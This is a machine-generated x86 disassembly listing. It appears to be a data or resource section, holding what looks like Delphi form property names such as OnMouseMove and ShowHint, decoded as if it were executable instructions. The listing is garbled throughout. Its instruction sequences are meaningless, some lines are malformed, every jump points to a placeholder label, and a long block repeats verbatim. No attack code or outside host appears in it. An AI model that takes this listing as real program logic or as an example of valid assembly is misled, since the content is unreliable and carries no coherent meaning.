inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
jae r-xdata
add al bl
add [ eax ] eax
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
insb
mov esp 0x4000447f
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
inc esp
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
jg r-xdata
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
pop edx
push edi
push 0x556c6565
jo r-xdata
jae r-xdata
push edi
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
or [ ecx + 0x44 ] bh
add al ah
jae r-xdata
add [ eax ] bh
add [ eax ] eax
inc esi
add [ esi + 0x7e9c0040 ] al
inc esi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
jb r-xdata
outsb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
pop edx
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
je r-xdata
jpe r-xdata
or [ edi ] ah
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
mov esp 0x4800447f
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
push 0x446c6565
outsd
ja r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080059 ] al
outsb
push edx
push edi
bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al al
jns r-xdata
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
add [ edi + ecx * 4 ] ah
inc ecx
add ah bh
movsb [ edi ] [ esi ]
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0xffffffffa3900046 ]
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
add al dl
inc esp
test [ ecx ] bh
inc esi
add [ ecx + edi + 0x2f80046 ] bh
add [ eax ] al
mov al [ 0xffffffffcc004627 ]
outsd
arpl [ ebx - 0x10 ] bp
jl r-xdata
popad
push ss
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
add [ eax ] dh
pop edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ecx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x39bc0046 ] al
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x7d5c776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
mov ah 0x5a
pop eax
inc esi
add [ ecx + ebx * 4 + 0x46 ] al
add [ eax ] ah
jge r-xdata
inc esi
add al bh
add al [ eax ]
add [ eax - 0x33ffb9d9 ] ah
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ eax + 0x4638 ] 0x0
add [ eax ] al
add [ eax + eax * 4 ] ah
inc esi
add al bh
cdq
add ah bl
jpo r-xdata
0x65dc0046 0x46
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add [ esi ] 0xf8
inc esi
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
sub_462da2
fdiv [ ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
jb r-xdata
popad
outsb
jae r-xdata
and [ esi ] 0x42
add [ eax ] dh
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc esi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
or eax [ edx + 0x6f ]
jb r-xdata
inc esp
add [ eax + ecx * 8 + 0x71800044 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ edx ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
call 0x51452e5a
mov [ 0x10046 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax - 0x3e ] bh
inc esp
add ah dl
inc esi
imul ebp [ edi + 0x6e ] r-xdata
mov esp 0x40044c2
inc esi
add [ edx ] ch
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
and eax 0x2310046
add bh bh
xor [ edx ] eax
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] eax
push cs
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
add [ 0x622c0046 ] al
je r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x4cff0001 ] ah
xor eax [ ebp ]
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
xchg esp eax
sbb al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
add [ gs : edi + 0x44 ] dh
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
aam 0x64
insb
sbb al 0x86
inc esp
add [ ecx + eax ] ch
add [ eax ] al
clc
outsb
je r-xdata
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
xor [ ebp ] eax
sbb al 0x32
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x700ffff ] ah
jbe r-xdata
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
dec esp
js r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
mov al [ 0x10044c9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
adc [ eax ] al
cmpsd [ esi ] [ edi ]
add [ eax ] eax
dec [ ebx + esi + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dh
[ eax + 0x10044ed ]
add [ eax ] al
add [ ebx + eax * 2 ] cl
inc edx
add ah ch
add al [ eax ]
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
outsb
je r-xdata
dec ecx
imul ebp [ ebp + 0x4c ] 0x800461f
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
jb r-xdata
inc esi
sub eax [ edx ]
push 0x68ff0000
leave
inc esp
add [ eax - 0x37 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
cmp al 0x10
inc eax
add ah cl
je r-xdata
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
cmp al 0x2
add [ edi ] ch
add al [ eax ]
push [ eax - 0x7fffb98f ]
jno r-xdata
and al 0x46
and eax 0x2300046
add bh bh
adc al 0x75
inc esi
add [ eax + 0x4671 ] al
add al ah
je r-xdata
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
add al [ eax ]
call [ esi * 2 + 0x71800046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
inc ebx
rol [ ebp ] 0x48
add al [ eax ]
jb r-xdata
inc edx
add [ eax + 0x2 ] al
add bh bh
je r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ eax + 0x4671 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
inc eax
add [ eax + eax ] cl
[ eax + eax * 8 ]
insb
cmp al 0x10
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
outsb
outsb
arpl [ eax + 0x28 ] bp
les eax [ ebp ]
jl r-xdata
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
add [ esi * 2 + 0x71800046 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
outsb
je r-xdata
popad
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
arpl [ edx + 0x6f ] si
insb
add [ cs : esi ] cl
dec edi
insb
inc ebx
inc esi
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add bh bh
sub al 0xc8
inc esp
add [ eax + 0x4671 ] al
add [ eax ] al
inc eax
add [ eax ] dh
jne r-xdata
outsb
jne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
int3
add [ eax ] al
dec edi
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ 0xffffffffe9400046 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
sub eax [ edx ]
add bh bh
sub al 0x76
inc esi
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jb r-xdata
add bh bh
lodsb [ esi ]
jb r-xdata
mov esp 0x2600045
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] cl
add bh bh
or al al
inc esp
add [ edx ] bh
pop ds
inc esi
add [ edx + eax ] cl
add bh bh
mov [ ecx + 0x46 ] ss
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
je r-xdata
add [ eax + 0x2 ] bl
add bh bh
shl [ edx + 0x46 ] 0x1
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
mov ah 0x5a
movsb [ edi ] [ esi ]
jle r-xdata
dec eax
add [ eax ] al
dec [ eax ]
rol [ eax + eax + 0x3c ] 0x62
inc ebp
xor al 0x21
inc esi
add [ ebx ] ch
add al [ eax ]
[ esi + esi * 2 ]
pop edx
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec edi
outsb
inc esp
jb r-xdata
clc
jpo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov ah 0x5a
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
inc ebx
insb
outsd
jae r-xdata
xor al 0x7e
inc esp
add al al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jbe r-xdata
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
inc esp
jae r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
les esp [ esi ]
inc esi
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xb46f666e
pop edx
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
mov ah 0x5a
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
jb r-xdata
jo r-xdata
hlt
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ eax + 0x4671 ]
push eax
outsd
jo r-xdata
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ecx
jpe r-xdata
inc esp
daa
inc esi
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ edi + 0x6e ]
jpe r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec eax
add [ edx ] cl
dec edi
jpo r-xdata
or [ edx ] 0xa
dec edi
jl r-xdata
jns r-xdata
mov al [ 0xffffffff80ff0002 ]
jno r-xdata
jo r-xdata
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
arpl [ ebx - 0x58 ] bp
jge r-xdata
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
dec eax
insb
jo r-xdata
add bh bh
test al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ esi ] al
dec edi
jns r-xdata
jbe r-xdata
add al ch
add [ eax ] al
dec ecx
inc ebp
outsb
inc esp
outsd
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
outsb
dec eax
imul esp [ ebp + 0x44 ] 0xa8004627
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jb r-xdata
outsb
add [ eax - 0x4700ffff ] bh
je r-xdata
pop edx
inc ecx
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
add [ eax ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
pop edx
inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
jae r-xdata
add al bl
add [ eax ] eax
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
insb
mov esp 0x4000447f
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
inc esp
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
jg r-xdata
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
pop edx
push edi
push 0x556c6565
jo r-xdata
jae r-xdata
push edi
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
or [ ecx + 0x44 ] bh
add al ah
jae r-xdata
add [ eax ] bh
add [ eax ] eax
inc esi
add [ esi + 0x7e9c0040 ] al
inc esi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
jb r-xdata
outsb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
pop edx
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
je r-xdata
jpe r-xdata
or [ edi ] ah
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
mov esp 0x4800447f
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
push 0x446c6565
outsd
ja r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080059 ] al
outsb
push edx
push edi
bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al al
jns r-xdata
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
add [ edi + ecx * 4 ] ah
inc ecx
add ah bh
movsb [ edi ] [ esi ]
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0xffffffffa3900046 ]
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
add al dl
inc esp
test [ ecx ] bh
inc esi
add [ ecx + edi + 0x2f80046 ] bh
add [ eax ] al
mov al [ 0xffffffffcc004627 ]
outsd
arpl [ ebx - 0x10 ] bp
jl r-xdata
popad
push ss
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
add [ eax ] dh
pop edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ecx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x39bc0046 ] al
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x7d5c776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
mov ah 0x5a
pop eax
inc esi
add [ ecx + ebx * 4 + 0x46 ] al
add [ eax ] ah
jge r-xdata
inc esi
add al bh
add al [ eax ]
add [ eax - 0x33ffb9d9 ] ah
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ eax + 0x4638 ] 0x0
add [ eax ] al
add [ eax + eax * 4 ] ah
inc esi
add al bh
cdq
